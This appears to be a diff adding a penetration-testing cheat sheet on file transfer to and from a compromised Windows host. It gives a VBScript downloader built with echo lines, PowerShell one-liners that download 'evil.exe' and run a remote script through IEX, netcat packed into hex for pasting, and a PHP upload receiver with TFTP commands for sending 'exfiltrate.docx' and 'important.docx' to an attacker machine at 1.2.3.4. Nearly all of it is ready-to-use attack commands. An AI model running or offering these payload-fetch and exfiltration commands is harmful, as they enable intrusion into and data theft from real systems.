@@ -1,0 +1,95 @@
+.vbs script
+echo strUrl = WScript.Arguments.Item(0) > wget.vbs
+echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
+echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
+echo  Err.Clear >> wget.vbs
+echo  Set http = Nothing >> wget.vbs
+echo  Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
+echo  If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
+echo  If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
+echo  If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
+echo  http.Open "GET", strURL, False >> wget.vbs
+echo  http.Send >> wget.vbs
+echo  varByteArray = http.ResponseBody >> wget.vbs
+echo  Set http = Nothing >> wget.vbs
+echo  Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
+echo  Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
+echo  strData = "" >> wget.vbs
+echo  strBuffer = "" >> wget.vbs
+echo  For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
+echo  ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
+echo  Next >> wget.vbs
+echo  ts.Close >> wget.vbs
+
+scsript wget.vbs http://1.2.3.4/evil.exe evil.exe
+
+================================================================================================
+POWERSHELL
+echo $webclient = New-Object System.Net.WebClient >>wget.ps1
+echo $url = "http://10.11.0.4/evil.exe" >>wget.ps1
+echo $file = "new-exploit.exe" >>wget.ps1
+echo $webclient.DownloadFile($url,$file) >>wget.ps1
+
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+or
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http:/1.2.3.4/evil.exe', 'new-exploit.exe')
+================================================================================================
+
+download and run a PS script
+
+powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://1.2.3.4/evil.ps1')
+
+================================================================================================
+binary --> compress --> to hex --> copy paste in win host
+
+locate nc.exe | grep binaries
+cp /path/whatever/nc.exe .
+upx -9 nc.exe
+exe2hex -x nc.exe -p nc.cmd
+copy paste the script in win host
+nc -h
+
+================================================================================================
+Win upload
+
+on Kali
+in /var/www/html
+upload.php
+
+<?php
+$uploaddir = '/var/www/uploads/';
+
+$uploadfile = $uploaddir . $_FILES['file']['name'];
+
+move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
+?>
+
+sudo mkdir /var/www/uploads
+ps -ef | grep apache
+sudo chown www-data: /var/www/uploads
+
+on win host
+powershell (New-Object System.Net.WebClient).UploadFile('http://1.2.3.4/upload.php', 'exfiltrate.docx')
+
+================================================================================================
+tftp server on Kali
+
+sudo apt update && sudo apt install atftp
+sudo mkdir /tftp
+sudo chown nobody: /tftp
+sudo atftpd --daemon --port 69 /tftp
+
+
+tftp client on win host
+tftp -i 1.2.3.4 put important.docx
+
+
+
+
+
+
+
